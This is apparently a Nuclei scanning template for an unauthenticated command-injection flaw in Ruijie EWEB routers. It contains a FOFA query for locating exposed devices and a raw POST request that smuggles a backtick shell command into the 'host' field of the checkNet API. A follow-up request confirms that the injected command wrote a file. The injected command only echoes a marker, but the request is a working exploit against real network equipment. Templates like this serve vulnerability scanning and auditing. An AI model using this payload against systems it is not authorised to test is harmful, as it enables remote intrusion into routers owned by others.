id: ruijie-eweb-route-auth-rce

info:
  name: ruijie EWEB-route auth - Remote Code Execution
  author: qwtd
  severity: critical
  description: 锐捷EWEB路由器 auth 远程命令执行漏洞
  reference: |
    https://mp.weixin.qq.com/s/RPOiYNJdwLkXtmDbQa7dRg
  metadata:
    fofa-query: fofabody="cgi-bin/luci" && body="#f47f3e"
  tags: Ruijie-EWEB网管系统
variables:
  a1: "{{randstr}}"
  a2: "{{rand_base(6)}}"

http:
  - raw:
      - |
        POST /cgi-bin/luci/api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        {"method":"checkNet","params":{"host":"`echo {{a1}}>{{a2}}.txt`"}}
      - |
        GET /cgi-bin/{{a2}}.txt HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{a1}}"
        part: body_2
        
      - type: status
        status:
          - 200
        part: status_code_2